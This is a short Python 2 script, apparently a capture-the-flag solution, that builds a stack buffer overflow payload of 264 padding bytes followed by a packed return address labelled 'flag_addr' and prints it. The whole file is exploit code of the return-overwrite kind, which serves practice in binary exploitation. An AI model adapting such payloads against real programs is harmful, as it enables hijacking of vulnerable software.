import struct

flag_addr = 0x40062d

payload = 'A' * 264
payload += struct.pack('<Q', flag_addr)  

print payload
